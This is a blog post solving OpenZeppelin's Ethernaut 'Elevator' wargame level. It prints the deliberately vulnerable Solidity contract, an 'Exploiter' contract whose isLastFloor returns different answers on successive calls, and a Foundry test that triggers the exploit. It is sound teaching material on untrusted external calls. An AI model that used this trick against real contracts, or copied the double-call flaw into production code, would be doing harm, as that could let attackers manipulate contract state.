---
title: 'Ethernaut Challenge #11 Solution — Elevator'
excerpt: This is Part 11 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>The goal of this challenge is to be able to reach the top floor of the building.
coverImage:
  url: '/assets/blog/ethernaut/fallback.svg'
  credit:
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2020-07-21T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/elevator.svg'
---

This is Part 11 of the ["Let's play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

# Challenge #11: Elevator

> This elevator won't let you reach the top of your building. Right?
> Things that might help:
>
> - Sometimes solidity is not good at keeping promises.
> - This `Elevator` expects to be used from a `Building`.
>
> Level author: [Martin Triay](https://github.com/martriay)

The goal of this challenge is to be able to reach the top floor of the building.

## Study the contracts

The code of the Challenge's Level is pretty simple, let's dump it here and study it

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

```

The `Elevator` is a pretty simple contract.

It has two state variables:

- `bool public top` a boolean variable that will state if the elevator has arrived to the top of the building. It is initialized as `false` by default
- `uint256 public floor` an integer variable that will state to which floor the elevator has arrived. It is initialized to `0` by default

Then we have the `goTo` function that takes a `uint256 _floor`. This function is expected to be called by a smart contract that implements the `Building` interface.

Inside the function, it checks the `Building.isLastFloor` result that **should** state whether a floor is the top of the building or not.

If the floor **is not** the top of the building, the function update the `floor` state variable and update also the `top` state variable that should be `false` given that we entered the `if` state only because the same `building.isLastFloor` function has returned `false` just two lines of code above, **right**?

This challenge teaches two important lessons:

- **never, ever, trust an external actor as an assumption**
- **better safe than sorry**

The `msg.sender` (the Building contract) is an external actor. We only know that it must implement the `Building` interface, so it must:

- have a function called `isLastFloor`
- it takes a `uint256` input parameter
- it will return a `bool`

But in reality, apart from this information, we don't know what's inside that contract. How can we be certain that it will **really** return `true` **only** if the floor is the real top of the building?

My two cents suggestions would be:

- Only integrate with external contract that have a verified source code and that you can read what they do and with which other external service they will integrate
- If the external service is upgradable, you must really trust that the owner of the service will not act maliciously in the future
- Even if you trust the external actor, put some safeguards in the contract like some kind of pausable and emergency logic

## Solution code

The solution code is pretty simple, what we must do is to trick the `Elevator` to think that we have not reached the top of the building when it first calls the `isLastFloor` function and then return `true` (we have reached the top) when it calls it the second time.

Here's the code of the `Building` contract

```solidity
contract Exploiter is Building {
    Elevator private victim;
    address private owner;
    bool private firstCall;

    constructor(Elevator _victim) public {
        owner = msg.sender;
        victim = _victim;
        firstCall = true;
    }

    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        // if the Elevator call us the first time return `false` to trick him
        // but return `true` if the second time to exploit it
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
```

And here's the code of the test itself

```solidity
function exploitLevel() internal override {
    vm.startPrank(player, player);

    // deploy the contract
    Exploiter exploiter = new Exploiter(level);

    // trigger the exploit
    exploiter.goTo(0);

    // assert that the elevator has reached the top of the building
    assertEq(level.top(), true);

    vm.stopPrank();
}
```

You can read the full solution of the challenge opening [Elevator.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/Elevator.t.sol)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
